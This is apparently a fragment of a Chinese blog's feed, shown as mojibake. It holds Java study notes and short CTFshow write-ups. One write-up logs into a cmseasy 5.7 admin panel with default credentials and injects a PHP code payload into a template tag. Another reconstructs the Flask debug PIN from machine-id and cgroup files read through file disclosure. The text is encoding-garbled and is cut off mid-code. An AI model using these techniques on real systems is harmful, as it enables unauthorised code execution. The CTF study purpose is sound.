class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>JavaBean</strong></p><p>ä¹Ÿè¢«ç§°ä½œå®ä½“ç±»ï¼Œå…¶å¯¹è±¡å¯ç”¨äºåœ¨ç¨‹åºä¸­å°è£…æ•°æ®</p><p>è¦æ±‚ï¼š</p><ul><li>æˆå‘˜å˜é‡ç”¨privateä¿®é¥°</li><li>æä¾›å¯¹åº”æˆå‘˜å˜é‡çš„getä¸setæ–¹æ³•</li><li>å¿…é¡»æœ‰ä¸€ä¸ªæ— å‚æ„é€ å™¨ï¼Œæœ‰å‚æ„é€ å¯æœ‰å¯æ— </li></ul><p><strong>Stringç±»</strong></p><p>ä¸å¯å˜ï¼šæŒ‡åŸå§‹å­—ç¬¦ä¸²ä¸å¯å˜ï¼Œç»è¿‡+è¿ç®—åäº§ç”Ÿæ–°çš„å­—ç¬¦ä¸²</p><p>åˆ›å»ºæ–¹å¼</p><pre class="line-numbers language-none"><code class="language-none">String s&#x3D;new String(&quot;flag&quot;);char[] chars&#x3D;&#123;&#39;f&#39;,&#39;l&#39;,&#39;a&#39;,&#39;g&#39;&#125;;String s&#x3D;new String(chars);byte[] bytes&#x3D;&#123;102,108,97,103&#125;String s&#x3D;new String(bytes);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Stringå¸¸ç”¨API</strong></p><pre class="line-numbers language-none"><code class="language-none">s1.equals(s2)&#x2F;&#x2F;æ¯”è¾ƒs1ï¼Œs2å­—ç¬¦ä¸²å†…å®¹æ˜¯å¦ç›¸åŒequalsIgnoreCaseå¿½ç•¥å¤§å°å†™s1.charAt(Index)&#x2F;&#x2F;è·å–Indexä½ç½®çš„å­—ç¬¦s1.toCharArray()&#x2F;&#x2F;å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºcharæ•°ç»„s1.substring(head,end)&#x2F;&#x2F;æˆªå–å­—ç¬¦ä¸²s1.replace(target,replacement)&#x2F;&#x2F;å°†å­—ç¬¦ä¸²ä¸­çš„targetç”¨replacementæ›¿æ¢s1.contains(s)&#x2F;&#x2F;å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«så­—ç¬¦ä¸²s1.startWiths(s)&#x2F;&#x2F;å­—ç¬¦ä¸²æ˜¯å¦ä»¥så­—ç¬¦ä¸²å¼€å§‹s1.spilt(s)&#x2F;&#x2F;ä»¥sä¸ºåˆ†å‰²ç¬¦æ¥å°†å­—ç¬¦ä¸²åˆ‡å‰²<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ArrayList</strong></p><pre class="line-numbers language-none"><code class="language-none">ArrayList list&#x3D;new ArrayList()list.add(ele)&#x2F;&#x2F;å‘åˆ—è¡¨ä¸­æ·»åŠ å…ƒç´ ï¼ˆæ— ç±»å‹é™åˆ¶ï¼‰list.add(index,ele)&#x2F;&#x2F;å‘åˆ—è¡¨æŒ‡å®šä½ç½®æ’å…¥å…ƒç´ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ArrayListæ”¯æŒæ³›å‹ï¼Œå¯é€šè¿‡<code>ArrayList&lt;æ•°æ®ç±»å‹&gt;</code>æ¥é™å®šåˆ—è¡¨ä¸­çš„æ•°æ®ç±»å‹</p><p>ä¸€äº›API</p><pre class="line-numbers language-none"><code class="language-none">list.get(index)&#x2F;&#x2F;è·å–æŒ‡å®šä½ç½®å…ƒç´ list.size()&#x2F;&#x2F;è·å–åˆ—è¡¨å…ƒç´ ä¸ªæ•°list.remove(index)&#x2F;&#x2F;åˆ é™¤æŒ‡å®šä½ç½®çš„å…ƒç´ list.set(index,ele)&#x2F;&#x2F;ä¿®æ”¹æŒ‡å®šä½ç½®çš„å…ƒç´ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é¢å‘å¯¹è±¡å’¯"><a href="#é¢å‘å¯¹è±¡å’¯" class="headerlink" title="é¢å‘å¯¹è±¡å’¯"></a>é¢å‘å¯¹è±¡å’¯</h3><p><strong>staticå…³é”®å­—</strong></p><ul><li>staticæ˜¯é™æ€çš„æ„æ€ï¼Œå¯ä»¥ç”¨æ¥ä¿®é¥°æˆå‘˜å˜é‡å’Œæˆå‘˜æ–¹æ³•</li><li>staticä¿®é¥°æˆå‘˜å˜é‡è¡¨ç¤ºè¯¥æˆå‘˜å˜é‡å€¼åœ¨å†…å­˜ä¸­å‚¨å­˜ä¸€ä»½ï¼Œå¯ä»¥è¢«å…±äº«è®¿é—®ä¿®æ”¹</li><li>é™æ€æˆå‘˜å˜é‡å¸¸ç”¨æ¥è¡¨ç¤ºéœ€è¦è¢«å…±äº«çš„ä¿¡æ¯ï¼Œå¯ä»¥è¢«å…±äº«è®¿é—®</li><li>é™æ€æˆå‘˜å˜é‡å’Œæ–¹æ³•è®¿é—®æ—¶å¯é€šè¿‡<code>ç±»å.æˆå‘˜</code>ä¹Ÿå¯é€šè¿‡<code>å¯¹è±¡å.æˆå‘˜</code>è®¿é—®ï¼Œå»ºè®®é€šè¿‡ç±»è®¿é—®</li><li>åœ¨åŒä¸€ä¸ªç±»ä¸­ï¼Œè®¿é—®é™æ€æ–¹æ³•ï¼Œç±»åå¯ä»¥çœç•¥ä¸å†™</li><li>æ³¨æ„è°ƒç”¨é™æ€æˆå‘˜æ–¹æ³•ï¼ˆåŒ…æ‹¬é€šè¿‡å¯¹è±¡è°ƒç”¨ï¼‰ï¼Œæ–¹æ³•ä¸­ä¸èƒ½è°ƒç”¨éé™æ€æˆå‘˜å˜é‡å“¦ï¼ˆå¦‚ä¸‹å›¾ï¼‰</li><li><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207050029328.png"></li><li>é™æ€æ–¹æ³•ä¸­ä¸å¯ä»¥å‡ºç°thiså…³é”®å­—</li></ul><p><strong>é™æ€æ–¹æ³•åº”ç”¨</strong></p><ul><li>å¯ç”¨äºæ„é€ å·¥å…·ç±»ï¼Œç”±äºä¸éœ€è¦è¿›è¡Œå®ä¾‹åŒ–ï¼Œå¯å°†ç±»çš„æ„é€ å‡½æ•°è®¾ç½®æˆç§æœ‰æƒé™</li></ul><p><strong>ä»£ç å—</strong></p><p>å®šä¹‰ï¼šèŠ±æ‹¬å·æ‹¬èµ·æ¥çš„éƒ½æ˜¯ä»£ç å—</p><ul><li>staticä»£ç å—ï¼ˆstatic{}ï¼‰ï¼š<ul><li>å±äºç±»ï¼Œä¸ç±»ä¸€èµ·ä¼˜å…ˆåŠ è½½ï¼ˆæ¯”mainè¿˜å¿«ï¼‰ä¸€æ¬¡ï¼Œè‡ªåŠ¨è§¦å‘æ‰§è¡Œ</li><li>ä½œç”¨ï¼šå¯ä»¥ç”¨äºåˆå§‹åŒ–é™æ€èµ„æºï¼Œä¸€è¾¹åç»­ä½¿ç”¨</li></ul></li><li>å®ä¾‹ä»£ç å—ï¼ˆ{}ï¼‰ï¼š<ul><li>å±äºå¯¹è±¡ï¼Œæ¯æ¬¡æ„å»ºå¯¹è±¡æ—¶ï¼Œéƒ½ä¼šå‡ºå‘ä¸€æ¬¡æ‰§è¡Œ</li><li>ä½œç”¨ï¼šåˆå§‹åŒ–å®ä¾‹èµ„æº</li></ul></li></ul><p><strong>è®¾è®¡æ¨¡å¼</strong>ï¼šåœ¨å¼€å‘ä¸­ç»å¸¸é‡åˆ°çš„é—®é¢˜çš„æœ€ä¼˜è§£</p><p><strong>å•ä¾‹æ¨¡å¼</strong></p><p>ä¸€ä¸ªç±»åªèƒ½åˆ›å»ºä¸€ä¸ªå¯¹è±¡</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//é¥¿æ±‰å•ä¾‹ï¼Œåœ¨ç±»åŠ è½½æ—¶ç›´æ¥åˆ›é€ å¯¹è±¡</span><span class="token keyword">public</span> <span class="token keyword">class</span> danli <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> danli dddd<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">danli</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token function">danli</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å•ä¾‹è¢«åˆ›å»º"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//æ‡’æ±‰å•ä¾‹ï¼Œåœ¨ç±»å®ä¾‹é¦–æ¬¡è¢«è°ƒç”¨æ—¶åˆ›é€ å¯¹è±¡</span><span class="token keyword">public</span> <span class="token keyword">class</span> danli <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> danli dddd<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token function">danli</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å•ä¾‹è¢«åˆ›å»º"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> danli <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>dddd<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            dddd<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">danli</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> dddd<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ç»§æ‰¿</strong></p><ul><li><p>```<br>public class Son extends Father {}</p><pre class="line-numbers language-none"><code class="language-none">- superå…³é”®å­—  - &#96;super&#96;å¯ä»¥ç”¨æ¥å¼•ç”¨ç›´æ¥çˆ¶ç±»çš„å®ä¾‹å˜é‡ã€‚  - &#96;super&#96;å¯ä»¥ç”¨æ¥è°ƒç”¨ç›´æ¥çˆ¶ç±»æ–¹æ³•ã€‚  - &#96;super()&#96;å¯ä»¥ç”¨äºè°ƒç”¨ç›´æ¥çˆ¶ç±»æ„é€ å‡½æ•°ã€‚- æ„é€ æ–¹æ³•ï¼šé»˜è®¤å…ˆæ‰§è¡Œçˆ¶ç±»æ— å‚æ„é€ ï¼Œå†æ‰§è¡Œè‡ªå·±æ„é€ **åŒ…**- åŒ…æ˜¯ç”¨æ¥åˆ†åˆ«ç®¡ç†å„ç§ä¸åŒçš„ç±»çš„ï¼Œç±»ä¼¼æ–‡ä»¶å¤¹ï¼Œå»ºåŒ…æœ‰åˆ©äºç¨‹åºçš„ç®¡ç†å’Œç»´æŠ¤- åŒ…åè¯­æ³•æ ¼å¼ï¼šåŸŸåå€’å†™.æŠ€æœ¯åç§°- å»ºåŒ…è¯­å¥å¿…é¡»åœ¨ç¬¬ä¸€è¡Œ- ç›¸åŒåŒ…ä¸‹çš„ç±»å¯ç›´æ¥è®¿é—®ï¼Œä¸åŒåŒ…ä¸‹ç±»å¿…é¡»å¯¼åŒ…ï¼Œ&#96;import åŒ…å.ç±»å&#96;- å¦‚æœè¯¥ç±»ä¸­ä½¿ç”¨ä¸åŒåŒ…ä¸‹ç›¸åŒçš„ç±»åï¼Œæ­¤æ—¶é»˜è®¤åªèƒ½å¯¼å…¥ä¸€ä¸ªç±»çš„åŒ…ï¼Œå¦ä¸€ä¸ªç±»çš„è¦ä½¿ç”¨å…¨åè®¿é—®**æƒé™ä¿®é¥°ç¬¦**- ç§æœ‰ï¼š&#96;private&#96;  - åªèƒ½åœ¨æœ¬ç±»ä¸­è®¿é—®- ç¼ºçœï¼šå•¥éƒ½ä¸åŠ   - åªèƒ½æœ¬ç±»ï¼Œæœ¬åŒ…ä¸‹è®¿é—®- ä¿æŠ¤ï¼š&#96;protected&#96;  - æœ¬ç±»ï¼ŒåŒåŒ…çš„å…¶ä»–ç±»ä¸­ï¼Œå…¶ä»–åŒ…çš„å­ç±»ä¸­- å…¬å…±ï¼š&#96;public&#96;  - è°éƒ½èƒ½è®¿é—®**finalå…³é”®å­—**- ä¿®é¥°ç±»ï¼šè¡¨æ˜æœ€ç»ˆç±»ï¼Œä¸å¯è¢«ç»§æ‰¿- ä¿®é¥°æ–¹æ³•ï¼šè¡¨æ˜æœ€ç»ˆæ–¹æ³•ï¼Œä¸å¯è¢«é‡å†™- ä¿®é¥°å˜é‡ï¼šè¡¨æ˜å˜é‡ç»è¿‡é¦–æ¬¡èµ‹å€¼åï¼Œä¸èƒ½å†æ¬¡è¢«èµ‹å€¼- å¸¸é‡å®šä¹‰ï¼š&#96;public static final&#96;**æšä¸¾**- ä½œç”¨ï¼šä¸ºäº†åšä¿¡æ¯çš„æ ‡å¿—å’Œä¿¡æ¯çš„åˆ†ç±»- &#96;&#96;&#96;java  ä¿®é¥°ç¬¦ enum æšä¸¾åç§°&#123;  ç¬¬ä¸€è¡Œéƒ½æ˜¯ç½—åˆ—æšä¸¾ç±»å®ä¾‹çš„åç§°  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>æšä¸¾éƒ½ç»§æ‰¿è‡ªæšä¸¾ç±»å‹ï¼š<code>java.lang.Enum</code></p></li><li><p>æšä¸¾ç±»éƒ½æ˜¯æœ€ç»ˆç±»</p></li><li><p>æ„é€ å™¨çš„æ„é€ å™¨éƒ½æ˜¯ç§æœ‰çš„ï¼Œæšä¸¾å¯¹å¤–ä¸èƒ½åˆ›å»ºå¯¹è±¡</p></li><li><p>æšä¸¾ç±»çš„ç¬¬ä¸€è¡Œé»˜è®¤éƒ½æ˜¯ç½—åˆ—æšä¸¾å¯¹è±¡çš„åç§°çš„</p></li><li><p>æšä¸¾ç±»ç›¸å½“äºæ˜¯å¤šä¾‹æ¨¡å¼</p></li><li><p>```java<br>//æšä¸¾ç±»çš„ä½œç”¨å®ä¾‹ä»£ç <br>//ä¾‹å¦‚å¼€å‘æ¸¸æˆæ¥å—ç”¨æˆ·è¾“å…¥çš„å››ä¸ªæ–¹å‘çš„ä¿¡å·<br>//å¦‚æœé€‰æ‹©å¸¸é‡ï¼Œå…·æœ‰å¯è¯»æ€§ä½†æ˜¯å…¥å‚å€¼ä¸å—çº¦æŸ<br>//Orientation.java<br>public enum Orientation {</p><pre><code>UP,DOWN,LEFT,RIGHT</code></pre><p>}<br>//zhu.java<br>public class zhu {</p><pre><code>public static void move(Orientation o)&#123;    switch (o)&#123;        case UP -&gt; System.out.println(&quot;å¾€ä¸Šèµ°&quot;);        case DOWN -&gt;System.out.println(&quot;å¾€ä¸‹èµ°&quot;);        case LEFT -&gt; System.out.println(&quot;å¾€å·¦èµ°&quot;);        case RIGHT -&gt; System.out.println(&quot;å¾€å³èµ°&quot;);    &#125;&#125;public static void main(String[] args) &#123;    move(Orientation.RIGHT);&#125;</code></pre><p>}</p><pre class="line-numbers language-none"><code class="language-none">- ![](https:&#x2F;&#x2F;jlan-blog.oss-cn-beijing.aliyuncs.com&#x2F;202207061509169.png)**æŠ½è±¡**- abstractä¿®é¥°çš„ç±»å°±æ˜¯æŠ½è±¡ç±»ï¼Œä¿®é¥°çš„æ–¹æ³•å°±æ˜¯æŠ½è±¡æ–¹æ³•- å†™æŠ½è±¡æ–¹æ³•æ—¶ä¸èƒ½å†™æ–¹æ³•ä½“- å¦‚æœä¸€ä¸ªç±»ä¸­çš„æ–¹æ³•è¢«å£°æ˜æˆä¸ºæŠ½è±¡æ–¹æ³•ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»å¿…é¡»è¢«å£°æ˜ä¸ºæŠ½è±¡ç±»- &#96;&#96;&#96;java  public abstract class animal &#123;      public abstract void run();  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>æŠ½è±¡ç±»å¯ä»¥ç†è§£ä¸ºä¸å®Œæ•´çš„è®¾è®¡å›¾ï¼Œä¸€èˆ¬åšçˆ¶ç±»</p></li><li><p>å½“çˆ¶ç±»çŸ¥é“å­ç±»éœ€è¦å®ŒæˆæŸäº›è¡Œä¸ºï¼Œè€Œå„ä¸ªå­ç±»å®ç°æ–¹æ³•åˆä¸åŒï¼Œå°±æŠŠè¯¥ç±»å®šä¹‰ä¸ºæŠ½è±¡æ–¹æ³•</p></li></ul><p><strong>æ¥å£</strong></p><ul><li><p>```java<br>//æ¥å£å®šä¹‰<br>public interface æ¥å£å{</p><pre><code>    //å¸¸é‡    //æŠ½è±¡æ–¹æ³•</code></pre><p>}</p><pre class="line-numbers language-none"><code class="language-none">- &#96;&#96;&#96;java  &#x2F;&#x2F;æ¥å£å®ç°  class ç±»å implements æ¥å£1,æ¥å£2...&#123;  &#x2F;&#x2F;æŠ½è±¡æ–¹æ³•é‡å†™  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>æ¥å£å¯ä»¥å¤šç»§æ‰¿ï¼Œä¸€ä¸ªæ¥å£å¯ä»¥ç»§æ‰¿å¤šä¸ªæ¥å£</p></li><li><p>æ¥å£ä¸èƒ½åˆ›å»ºå¯¹è±¡</p></li><li><p>ä¸€ä¸ªç±»å®ç°å¤šä¸ªæ¥å£ï¼Œå¤šä¸ªæ¥å£ä¸­æœ‰åŒæ ·çš„é™æ€æ–¹æ³•ä¸å†²çª</p></li><li><p>ä¸€ä¸ªç±»ç»§æ‰¿äº†çˆ¶ç±»åˆå®ç°äº†æ¥å£ï¼Œçˆ¶ç±»å’Œæ¥å£ä¸­çš„åŒåæ–¹æ³•ï¼Œé»˜è®¤ä½¿ç”¨çˆ¶ç±»çš„</p></li><li><p>ä¸€ä¸ªç±»å®ç°äº†å¤šä¸ªæ¥å£ï¼Œå¤šä¸ªæ¥å£ä¸­å­˜åœ¨åŒåçš„é»˜è®¤æ–¹æ³•ï¼Œä¸å†²çªï¼Œè¿™ä¸ªç±»é‡å†™è¯¥æ–¹æ³•å³å¯</p></li><li><p>ä¸€ä¸ªæ¥å£ç»§æ‰¿å¤šä¸ªæ¥å£æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œå¦‚æœå¤šä¸ªæ¥å£ä¸­å­˜åœ¨è§„èŒƒå†²çªåˆ™ä¸èƒ½ç»§æ‰¿</p></li><li><p>JDK8å¼€å§‹å¯¹æ¥å£åšçš„æ–°å¢æ–¹æ³•</p><ul><li>æ¥å£ä¸­å¯ä»¥æœ‰å¸¦æ–¹æ³•å®ç°çš„æ–¹æ³•</li><li>é»˜è®¤æ–¹æ³•ï¼šç±»ä¼¼ä¹‹å‰çš„æ™®é€šæ–¹æ³•ï¼Œä½¿ç”¨defalutä¿®é¥°ï¼Œé»˜è®¤ç”¨publicä¿®é¥°ã€‚éœ€è¦ç”¨æ¥å£å®ç°ç±»çš„å¯¹è±¡æ¥è°ƒç”¨</li><li>é™æ€æ–¹æ³•ï¼šä½¿ç”¨staticä¿®é¥°ï¼Œæ¥å£é™æ€æ–¹æ³•å¿…é¡»ç”¨æœ¬èº«çš„æ¥å£åæ¥è°ƒç”¨</li><li>ç§æœ‰æ–¹æ³•ï¼šä½¿ç”¨privateä¿®é¥°ï¼Œåªèƒ½åœ¨æœ¬ç±»ï¼ˆæœ¬æ¥å£ï¼‰ä¸­è¢«å…¶ä»–çš„é»˜è®¤æ–¹æ³•æˆ–è€…ç§æœ‰æ–¹æ³•è®¿é—®</li></ul></li></ul><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowCMS</title>
      <link href="/posts/478f3262.html"/>
      <url>/posts/478f3262.html</url>
      
        <content type="html"><![CDATA[<p><strong>477</strong></p><p>cmseasy 5.7ï¼Œç™¾åº¦æœæœæ¼æ´ï¼Œæœ‰åå°getshell</p><p>é¦–å…ˆ/adminç™»å½•åå°ï¼Œadmin:adminç›´æ¥ç™»å½•ï¼Œåœ¨æ¨¡ç‰ˆâ€”è‡ªå®šä¹‰æ ‡ç­¾ä¸­å†™å…¥payload</p><pre class="line-numbers language-none"><code class="language-none">1111111111111&quot;;&#125;&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¯å¢ƒå˜é‡é‡Œé¢æ‰¾å§</p><p><strong>478</strong></p><p>phpcms 9.6.0</p><p><strong>479</strong></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowå¸¸ç”¨å§¿åŠ¿</title>
      <link href="/posts/eaf7f5df.html"/>
      <url>/posts/eaf7f5df.html</url>
      
        <content type="html"><![CDATA[<p><strong>801</strong></p><h3 id="flaskè®¡ç®—PIN"><a href="#flaskè®¡ç®—PIN" class="headerlink" title="flaskè®¡ç®—PIN"></a>flaskè®¡ç®—PIN</h3><p><strong>ä»€ä¹ˆæ˜¯PINç </strong></p><p>PINç ä¹Ÿå°±æ˜¯flaskåœ¨å¼€å¯debugæ¨¡å¼ä¸‹ï¼Œè¿›è¡Œä»£ç è°ƒè¯•æ¨¡å¼çš„è¿›å…¥å¯†ç ï¼Œéœ€è¦æ­£ç¡®çš„PINç æ‰èƒ½è¿›å…¥è°ƒè¯•æ¨¡å¼</p><p><strong>æ³¨æ„äº‹é¡¹ï¼šè°¨è®°ï¼ï¼python 3.8ï¼ˆmd5ï¼‰å’Œ3.6ï¼ˆsha1ï¼‰pinç ç”Ÿæˆæ–¹å¼ä¸åŒ</strong></p><p><strong>ä½¿ç”¨æ¡ä»¶ï¼šflask debugæ¨¡å¼å¼€å¯ å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</strong></p><p>é¦–å…ˆæ˜¯python PINç çš„ç”Ÿæˆè„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ç”Ÿæ•ˆæ—¶é—´ä¸ºä¸€å‘¨</span>PIN_TIME <span class="token operator">=</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token keyword">def</span> <span class="token function">hash_pin</span><span class="token punctuation">(</span>pin<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pin<span class="token punctuation">&#125;</span></span><span class="token string"> added salt"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">,</span> <span class="token string">"replace"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span>_machine_id<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token comment">#è·å–æœºå™¨å·</span><span class="token keyword">def</span> <span class="token function">get_machine_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> _machine_id    <span class="token keyword">if</span> _machine_id <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> _machine_id    <span class="token keyword">def</span> <span class="token function">_generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        linux <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token comment"># machine-id is stable across boots, boot_id is not.</span>        <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> value<span class="token punctuation">:</span>            <span class="token comment">#è¯»å–æ–‡ä»¶è¿›è¡Œæ‹¼æ¥</span>                linux <span class="token operator">+=</span> value                <span class="token keyword">break</span>        <span class="token comment"># Containers share the same machine id, add some cgroup</span>        <span class="token comment"># information. This is used outside containers too but should be</span>        <span class="token comment"># relatively stable across boots.</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            <span class="token comment">#ç»§ç»­è¿›è¡Œæ‹¼æ¥ï¼Œè¿™é‡Œå¤„ç†ä¸€ä¸‹åªè¦/dockeråçš„ä¸œè¥¿</span>                linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">if</span> linux<span class="token punctuation">:</span>            <span class="token keyword">return</span> linux        <span class="token comment"># On OS X, use ioreg to get the computer's serial number.</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># subprocess may not be available, e.g. Google App Engine</span>            <span class="token comment"># https://github.com/pallets/werkzeug/issues/925</span>            <span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE            dump <span class="token operator">=</span> Popen<span class="token punctuation">(</span>                <span class="token punctuation">[</span><span class="token string">"ioreg"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"IOPlatformExpertDevice"</span><span class="token punctuation">,</span> <span class="token string">"-d"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE            <span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 